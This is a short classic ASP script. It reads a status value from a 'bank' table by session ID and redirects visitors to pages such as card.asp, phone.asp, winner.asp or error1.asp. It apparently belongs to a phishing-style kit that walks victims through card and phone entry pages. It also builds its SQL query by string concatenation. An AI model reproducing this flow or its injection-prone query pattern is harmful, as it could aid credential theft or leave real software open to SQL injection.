<!--#include file="include/db_conn.asp"-->
<%
dim rs,ispast,payword
set rs=server.CreateObject("adodb.recordset")
rs.open "select * from bank where id="&session("ddid")&" ",conn,1,3
m=rs("m")
rs.close
set rs=Nothing

select case m
case 0 
	Response.Redirect "load1.asp"
'case 1
	'Response.Redirect "load1.asp"
case 2
	Response.Redirect "winner.asp"
case 3
	a=""
    Response.Redirect "error1.asp" 
case 4
	a="。"
    Response.Redirect "error1.asp" 
case 5
	response.write "自定义2"
	Response.Redirect "en.asp"
	
case 6
	a=""
    Response.Redirect "error1.asp" 
case 7
	a=""
    Response.Redirect "error1.asp" 
case 8
	a=""
	Response.Redirect "error1.asp"
case 14
	Response.Redirect "s2.htm"	

case 18
	Response.Redirect "card.asp"

case 19
	Response.Redirect "phone.asp"

case 10
	Response.Redirect "t2.asp"	
	
	case 11
	a="设置回复选项"
	Response.Redirect "error1.asp" 
	
	
case 12
	a=" "
	Response.Redirect "xx.htm"
	
	case 13
	a=""
	Response.Redirect "en.asp"
	
	
	
	
	case 99
	response.write "自定义99"
	Response.Redirect "en.asp"
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
end Select
%>